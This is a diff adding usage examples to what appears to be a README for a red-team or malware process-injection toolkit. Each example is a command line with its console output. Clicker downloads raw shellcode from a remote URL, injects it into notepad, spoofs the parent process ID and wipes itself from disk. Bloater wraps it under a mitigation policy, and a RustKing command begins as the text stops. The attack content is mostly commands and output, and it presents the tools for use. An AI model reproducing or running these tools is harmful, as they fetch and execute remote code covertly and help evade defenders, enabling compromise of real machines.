@@ -67,9 +67,140 @@ Process Injector 1: Runner (Win32 API)
 
 [>] Runner.exe removed from disk!
 ```
+
 ### Clicker
+```
+C:\>Clicker.exe -u http://192.168.231.128:9090/demon.bin -t notepad -p 4160 -k
+
+       .:'                                  `:.
+      ::'                                    `::
+     :: :.                                  .: ::
+      `:. `:.             .             .:'  .:'
+       `::. `::           !           ::' .::'
+           `::.`::.    .' ! `.    .::'.::'
+             `:.  `::::'':!:``::::'   ::'
+             :'*:::.  .:' ! `:.  .:::*`:
+            :: HHH::.   ` ! '   .::HHH ::
+           ::: `H TH::.  `!'  .::HT H' :::
+           ::..  `THHH:`:   :':HHHT'  ..::
+           `::      `T: `. .' :T'      ::'
+             `:. .   :         :   . .:'
+               `::'               `::'
+                 :'  .`.  .  .'.  `:
+                 :' ::.       .:: `:
+                 :' `:::     :::' `:
+                  `.  ``     ''  .'
+                   :`...........':
+                   ` :`.     .': '
+                    `:  `"""'  :'   Clicker
+                    
+Process Injector 2: Clicker (Nt*API)
+
+  -u, --url      Required. Remote URL address for raw shellcode.
+
+  -t, --target   Specify the target/victim process. Default: Self-injection
+
+  -p, --parent   Spoof victim process under a Parent Process ID (This option is ignored for self-injection)
+
+  -k, --kill     Enable self-destruct to auto wipe file from disk.
+
+  -h, --help     Display help screen manual.
+  
+|--------------
+| Payload       : http://192.168.231.128:9090/demon.bin
+| Process       : C:\Windows\System32\notepad.exe
+| PPID Spoofing : 4160
+| Self Destruct : True
+|--------------
+
+[>] CreateProcessW()
+    |-> Target Process Created!
+    |-> PID: 13092
+
+[>] Fetching Payload
+    |-> Payload retrieved successfully!
+
+[>] NtAllocateVirtualMemory()
+    |-> Base Address: 0x23229800000
+
+[>] NtWriteVirtualMemory()
+    |-> Shellcode Injected!
+
+[>] NtProtectVirtualMemory()
+    |-> Flipping Memory Protection!
+
+[>] NtCreateThreadEx()
+    |-> Shellcode Executed!
+
+[>] DeleteProcThreadAttributeList()
+    |-> Deleting Process Artifacts!
+
+[>] CloseHandle()
+    |-> Closing Process Handle!
+
+[>] CloseHandle()
+    |-> Closing Thread Handle!
+
+[>] Clicker.exe removed from disk!
+```
+
 ### Bloater
+```
+C:\>Bloater.exe -f ./Clicker.exe -p 4160 -u http://192.168.231.128:9090/demon.bin -t notepad -s 4160
+                                                                    _
+                                                                  _( (~\
+           _ _                        /                          ( \> > \
+       -/~/ / ~\                     :;                \       _  > /(~\/
+      || | | /\ ;\                   |l      _____     |;     ( \/    > >
+      _\\)\)\)/ ;;;                  `8o __-~     ~\   d|      \      //
+     ///(())(__/~;;\                  "88p;.  -. _\_;.oP        (_._/ /
+    (((__   __ \\   \                  `>,% (\  (\./)8"         ;:'  i
+    )))--`.'-- (( ;,8 \               ,;%%%:  ./V^^^V'          ;.   ;.
+    ((\   |   /)) .,88  `: ..,,;;;;,-::::::'_::\   ||\         ;[8:   ;
+     )|  ~-~  |(|(888; ..``'::::8888oooooo.  :\`^^^/,,~--._    |88::  |
+     |\ -===- /|  \8;; ``:.      oo.8888888888:`((( o.ooo8888Oo;:;:'  |
+     |_~-___-~_|   `-\.   `        `o`88888888b` )) 888b88888P""'     ;
+     ; ~~~~;~~         "`--_`.       b`888888888;(.,"888b888"  ..::;-'
+       ;      ;              ~"-....  b`8888888:::::.`8888. .:;;;''
+          ;    ;                 `:::. `:::OOO:::::::.`OO' ;;;''
+     :       ;                     `.      "``::::::''    .'
+        ;                           `.   \_              /
+      ;       ;                       +:   ~~--  `:'  -';
+                                       `:         : .::/  - Bloater
+          ;                            ;;+_  :::. :..;;;
+                                       ;;;;;;,;;;;;;;;,;
+
+Process Injector 3 (Wrapper): Bloater (Process Mitigation Policy)
+
+  -f, --file       Required. Absolute path of file to be executed.
+
+  -p, --parent     Required. Spoof --file under a Parent Process ID.
+
+  -u, --url        Required. Remote URL address for raw shellcode.
+
+  -t, --target     Specify the target/victim process. Default: Self-injection
+
+  -s, --spoof      Spoof --target under a Parent Process ID.
+
+  -h, --help       Display help screen manual.
+  
+|--------------
+| File          : ./Clicker.exe
+| PPID Spoofing : 4160
+| Argument 1    : http://192.168.231.128:9090/demon.bin
+| Argument 2    : notepad
+| Argument 3    : 4160
+|--------------
+
+[>] CreateProcessW()
+    |-> Process Mitigation Policy Enforced!
+    |-> Spoofed Parent PID Successfully!
+    |-> Target Process Created!
+    |-> PID: 19520
+```
+
 ### RatKing
+
 ### RustKing
 ```
 C:\>RustKing.exe --url http://192.168.231.128:9090/demon.bin --target notepad.exe
